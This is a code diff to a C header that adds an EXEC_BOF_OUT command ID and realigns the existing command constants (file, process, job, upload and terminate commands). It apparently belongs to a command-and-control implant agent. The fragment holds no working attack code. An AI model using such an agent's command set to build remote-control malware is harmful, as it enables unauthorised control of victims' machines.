@@ -4,24 +4,25 @@
 #include "Packer.h"
 #include "Agent.h"
 
-#define COMMAND_CAT		  24
-#define COMMAND_CD		  8
-#define COMMAND_CP        12
-#define COMMAND_DISKS     15
-#define COMMAND_EXEC_BOF  50
-#define COMMAND_JOBS_LIST 46
-#define COMMAND_JOBS_KILL 47
-#define COMMAND_PWD       4
-#define COMMAND_LS		  14
-#define COMMAND_MV		  18
-#define COMMAND_MKDIR	  27
-#define COMMAND_PROFILE   21
-#define COMMAND_PS_LIST   41
-#define COMMAND_PS_KILL   42
-#define COMMAND_PS_RUN    43
-#define COMMAND_TERMINATE 10
-#define COMMAND_RM        17
-#define COMMAND_UPLOAD    33
+#define COMMAND_CAT		     24
+#define COMMAND_CD		     8
+#define COMMAND_CP           12
+#define COMMAND_DISKS        15
+#define COMMAND_EXEC_BOF     50
+#define COMMAND_EXEC_BOF_OUT 51
+#define COMMAND_JOBS_LIST	 46
+#define COMMAND_JOBS_KILL    47
+#define COMMAND_PWD          4
+#define COMMAND_LS		     14
+#define COMMAND_MV		     18
+#define COMMAND_MKDIR	     27
+#define COMMAND_PROFILE      21
+#define COMMAND_PS_LIST      41
+#define COMMAND_PS_KILL      42
+#define COMMAND_PS_RUN       43
+#define COMMAND_TERMINATE    10
+#define COMMAND_RM           17
+#define COMMAND_UPLOAD       33
 
 #define COMMAND_SAVEMEMORY 0x2321
 #define COMMAND_ERROR      0x1111ffff
